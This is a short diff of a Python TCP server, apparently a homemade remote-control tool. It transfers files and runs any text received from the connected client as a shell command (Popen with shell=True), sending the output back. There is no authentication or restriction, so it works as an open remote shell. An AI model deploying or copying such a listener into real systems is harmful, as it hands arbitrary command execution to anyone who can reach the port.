@@ -2,6 +2,7 @@ import os
 import socket
 import subprocess
 import sys
+from subprocess import Popen, PIPE
 
 
 def recieve_file(server_location): # run when client wants to upload file
@@ -69,6 +70,8 @@ def send_string_as_kb(st):
     kb += encoded_command
     con.send(kb)  # send command with 0-bytes in the beginning
 
+# def return_syntax_error(st):
+#     send_string_as_kb("Syntax error in recieved command:" + st)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -92,8 +95,9 @@ while True:
             command, server_location, client_location = map(str, command.split())
             send_file(server_location)
         else:
-            try:
-                result = subprocess.check_output(command).decode('utf-8')
-                send_string_as_kb(result)
-            except:
-                send_string_as_kb(str(sys.exc_info()[1]))
+            p = Popen([command], stdout = PIPE, stderr = PIPE, shell=True)
+            output, error = p.communicate()
+            if p.returncode == 0:
+                send_string_as_kb(output.decode('utf-8'))
+            else:
+                send_string_as_kb(error.decode('utf-8'))
